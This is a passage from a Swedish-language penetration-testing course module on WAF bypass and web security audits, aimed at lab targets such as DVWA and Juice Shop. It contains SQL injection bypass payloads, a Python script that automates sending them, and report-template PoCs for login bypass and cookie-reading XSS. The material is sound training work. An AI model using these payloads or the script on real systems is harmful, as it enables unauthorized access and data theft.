+```
+URL: http://localhost/index.php?id=1' OR 1=1--
+
+Expected: 403 Forbidden (WAF blocked)
+Result: _____________________________________________
+```
+
+**Steg 2: Try bypass techniques**
+
+```
+Test 1: Case variation
+Payload: 1' oR 1=1--
+Result: _____________________________________________
+
+Test 2: Comment injection
+Payload: 1'/**/OR/**/1=1--
+Result: _____________________________________________
+
+Test 3: URL encoding
+Payload: 1%27%20OR%201%3D1--
+Result: _____________________________________________
+
+Test 4: Alternative syntax
+Payload: 1' || '1'='1
+Result: _____________________________________________
+
+Test 5: Whitespace variation
+Payload: 1'\tOR\n1=1--
+Result: _____________________________________________
+```
+
+**Successful bypass:**
+```
+Working payload: _____________________________________
+Reason it worked: ____________________________________
+```
+
+**Python WAF Bypass Automation:**
+
+```python
+#!/usr/bin/env python3
+"""
+Automated WAF Bypass Testing
+"""
+
+import requests
+import time
+
+def test_waf_bypass(base_url, param, payloads):
+    """Test multiple bypass techniques"""
+
+    working_payloads = []
+
+    for name, payload in payloads.items():
+        url = f"{base_url}?{param}={payload}"
+
+        try:
+            response = requests.get(url, timeout=5)
+
+            # Check if blocked by WAF
+            if response.status_code == 403:
+                print(f"[X] {name}: BLOCKED")
+            elif response.status_code == 200:
+                # Check if SQL error (indicates injection worked)
+                if 'sql' in response.text.lower() or 'mysql' in response.text.lower():
+                    print(f"[+] {name}: SUCCESS!")
+                    working_payloads.append((name, payload))
+                else:
+                    print(f"[-] {name}: Not blocked, but no SQLi")
+
+            time.sleep(0.5)
+
+        except Exception as e:
+            print(f"[!] {name}: Error - {e}")
+
+    return working_payloads
+
+# Payloads
+payloads = {
+    'Normal': "1' OR 1=1--",
+    'Case Variation': "1' oR 1=1--",
+    'Comment Injection': "1'/**/OR/**/1=1--",
+    'URL Encoded': "1%27%20OR%201%3D1--",
+    'Double URL Encoded': "1%2527%2520OR%25201%253D1--",
+    'Alternative Syntax 1': "1' || '1'='1",
+    'Alternative Syntax 2': "1' OR '1'='1'#",
+    'Whitespace Tab': "1'\tOR\t1=1--",
+    'Inline Comment': "1'/*comment*/OR/*comment*/1=1--",
+    'Version Comment': "1'/*!50000OR*/1=1--",
+}
+
+target = "http://localhost/vulnerable.php"
+param_name = "id"
+
+print("[*] Testing WAF bypass techniques...")
+working = test_waf_bypass(target, param_name, payloads)
+
+print(f"\n[+] Working bypasses: {len(working)}")
+for name, payload in working:
+    print(f"  - {name}: {payload}")
+```
+
+---
+
+## 🏗️ STORT PROJEKT: Fullständig Säkerhetsaudit av Webbapplikation
+
+**Scenario:** Du har blivit anlitad för att utföra en komplett säkerhetsaudit av en webbapplikation.
+
+**Target:** OWASP Juice Shop eller DVWA
+
+**Projektomfattning:**
+
+### Fas 1: Reconnaissance (OSINT)
+```
+Duration: 2-3 timmar
+
+Uppgifter:
+1. DNS enumeration - hitta alla subdomains
+2. Technology stack identification
+3. Shodan/Censys reconnaissance
+4. Google Dorking för exponerad data
+5. Employee enumeration (om applicerbart)
+
+Deliverable: Reconnaissance Report (2-3 sidor)
+```
+
+### Fas 2: Vulnerability Scanning
+```
+Duration: 2-3 timmar
+
+Uppgifter:
+1. ZAP Spider (Traditional + AJAX)
+2. ZAP Active Scan
+3. Manual testing för OWASP Top 10
+4. Custom vulnerability checks
+
+Deliverable: Vulnerability Report med screenshots
+```
+
+### Fas 3: Exploitation (Ethical!)
+```
+Duration: 1-2 timmar
+
+Uppgifter:
+1. Exploatera minst 3 High-risk vulnerabilities
+2. Dokumentera PoC (Proof of Concept)
+3. Capture flags/data (om Juice Shop)
+
+Deliverable: Exploitation Documentation
+```
+
+### Fas 4: Reporting
+```
+Duration: 2-3 timmar
+
+Uppgifter:
+1. Executive Summary
+2. Detailed Findings
+3. Risk Assessment
+4. Remediation Recommendations
+5. Appendix med alla PoCs
+
+Deliverable: Professional Penetration Test Report (10+ sidor)
+```
+
+### Projektmall: Penetration Test Report
+
+```markdown
+# PENETRATION TEST REPORT
+
+## DOCUMENT INFORMATION
+Client: [Company Name]
+Tester: [Your Name]
+Date: [Date]
+Version: 1.0
+
+---
+
+## EXECUTIVE SUMMARY
+
+### Overview
+This report presents the findings of a comprehensive security assessment
+conducted on [Target Application] between [Start Date] and [End Date].
+
+### Scope
+- Target: http://[target-url]
+- Testing Type: Black Box / Grey Box / White Box
+- Duration: [X] days
+- Tester: [Name]
+
+### Key Findings Summary
+
+| Risk Level | Count |
+|------------|-------|
+| Critical   | X     |
+| High       | X     |
+| Medium     | X     |
+| Low        | X     |
+| Info       | X     |
+
+### Critical Issues
+1. [Critical Issue 1]
+2. [Critical Issue 2]
+
+### Recommendations Summary
+[Brief overview of top recommendations]
+
+---
+
+## METHODOLOGY
+
+### Approach
+1. Reconnaissance & Information Gathering
+2. Vulnerability Discovery
+3. Exploitation (Controlled)
+4. Documentation & Reporting
+
+### Tools Used
+- OWASP ZAP
+- Burp Suite
+- SQLmap
+- Nikto
+- [Other tools]
+
+### Testing Timeline
+- Day 1: Reconnaissance
+- Day 2-3: Vulnerability Scanning
+- Day 4: Manual Testing
+- Day 5: Reporting
+
+---
+
+## DETAILED FINDINGS
+
+### Finding 1: SQL Injection in Login Form
+
+**Severity:** Critical
+**CVSS Score:** 9.8
+**Affected Component:** /login.php
+
+**Description:**
+The login form is vulnerable to SQL injection, allowing an attacker
+to bypass authentication and gain unauthorized access.
+
+**Proof of Concept:**
+```sql
+Username: admin' OR '1'='1'--
+Password: anything
+```
+
+**Evidence:**
+[Screenshot showing successful exploitation]
+
+**Impact:**
+- Complete database compromise
+- Unauthorized access to admin panel
+- Potential data exfiltration
+
+**Remediation:**
+1. Use prepared statements for all SQL queries
+2. Implement input validation
+3. Apply principle of least privilege
+
+**References:**
+- OWASP SQL Injection: https://owasp.org/...
+- CWE-89: SQL Injection
+
+---
+
+### Finding 2: Cross-Site Scripting (XSS)
+
+**Severity:** High
+**CVSS Score:** 7.1
+**Affected Component:** /search.php
+
+**Description:**
+[Detailed description]
+
+**Proof of Concept:**
+```html
+<script>alert(document.cookie)</script>
+```
+
+**Evidence:**
+[Screenshots]
+
+**Impact:**
+[Impact description]
+
+**Remediation:**
+[Remediation steps]
+
+---
+
+[Continue for all findings...]
+
+---
+
+## RISK ASSESSMENT
+
+### Overall Risk Rating: HIGH
+
+**Justification:**
+[Explain overall risk]
+
+### Business Impact
+[Describe potential business impact]
+
+---
+
+## REMEDIATION ROADMAP
+
+### Immediate Actions (0-30 days)
+1. Fix SQL Injection vulnerabilities
+2. Implement WAF
+3. Update vulnerable components
+
+### Short-term (30-90 days)
+1. Security code review
+2. Penetration testing re-assessment
+3. Security training for developers
+
+### Long-term (90+ days)
+1. Implement SDL (Security Development Lifecycle)
+2. Regular security assessments
+3. Bug bounty program
+
+---
+
+## CONCLUSION
+
+[Summary and final recommendations]
+
+---
+
+## APPENDIX
+
+### A. Detailed PoCs
+### B. Tool Outputs
+### C. References
+
+```
+
+**Projektleveranser:**
+
+1. **Reconnaissance Report** (PDF)
+2. **Vulnerability Scan Results** (HTML från ZAP)
+3. **Screenshots** av alla PoCs
+4. **Final Penetration Test Report** (PDF, 10-15 sidor)
+5. **Remediation Checklist** (Excel/Markdown)
+
+**Bedömningskriterier:**
+
+- ✅ Genomförde komplett OSINT
+- ✅ Hittade minst 10 sårbarheter
+- ✅ Exploaterade minst 3 High-risk issues
+- ✅ Professionell rapport med screenshots
+- ✅ Tydliga remediation-rekommendationer
+
+---
+
+## 🎓 Sammanfattning Nivå 4
+
+### Vad du har lärt dig:
+
+✅ **Corporate OSINT** - Komplett företagsintelligens
+✅ **DNS Enumeration** - dnsenum, dnsrecon, Amass, custom scripts
+✅ **ZAP Python API** - 7 kompletta exempel från basic till advanced
+✅ **OWASP Top 10** - SQL Injection, Broken Access Control, CSRF, XXE, Command Injection
+✅ **SQLmap** - Basic till advanced exploitation
+✅ **WAF Bypass** - Tekniker för att kringgå säkerhet
+✅ **Professional Reporting** - Skriva pentesting-rapporter
+✅ **Full Penetration Test** - Komplett workflow från recon till rapport
+
+### Python Scripts skapade:
+
+🐍 15+ omfattande scripts (över 1,500 rader kod totalt!)
+- DNS enumeration automation
+- Subdomain discovery
+- ZAP automation (7 exempel)
+- SQLi testing
+- CSRF detection
+- Command Injection testing
+- WAF bypass automation
+- Custom vulnerability scanners
+
+### Verktyg bemästrade:
+
+🔧 dnsenum, dnsrecon, fierce, Amass
+🔧 OWASP ZAP API (fullständigt)
+🔧 SQLmap (basic till advanced)
+🔧 Shodan API
+🔧 theHarvester
+🔧 Custom Python security tools
+
+### Färdigheter förvärvade:
+
+💪 Professionell penetrationstestning
+💪 Security automation med Python
+💪 Professional rapportskrivning
+💪 OWASP Top 10 testing
+💪 WAF bypass-tekniker
+💪 Full säkerhetsaudit-process
+
+---
+
+## 🚀 Nästa Steg
+
+**Redo för Expert-nivå?**
+
+👉 **[Fortsätt till Nivå 5: Expert-nivå och Modern Teknik →](OSINT_ZAP_Guide_Niva_5.md)**
+
+Där lär du dig:
+- AI-driven OSINT och automation
+- ZAP i CI/CD pipelines (Jenkins, GitLab, GitHub Actions)
+- Cloud security testing (AWS, Azure, GCP)
+- Dark Web OSINT (etiskt och säkert)
+- Case studies: Bellingcat, Fortune 500 audits
+- Stort projekt: Full Security Assessment Pipeline
+- Modern API testing (REST, GraphQL, gRPC)
+- Kubernetes och container security
+
+---
+
+**[⬅️ Tillbaka till Nivå 3](OSINT_ZAP_Guide_Niva_3.md)** | **[🏠 Översikt](OSINT_ZAP_Guide_README.md)** | **[➡️ Nästa: Nivå 5](OSINT_ZAP_Guide_Niva_5.md)**
+
+---
+
+**Nivå 4 Komplett! ✅**
+
+*Grattis! Du har nu avancerade färdigheter i OSINT och penetrationstestning. Du är redo för expert-nivån!*
+
+**Total längd Nivå 4:** ~7,500 ord | **Python-exempel:** 15+ scripts | **Övningar:** 7 + 1 stort projekt
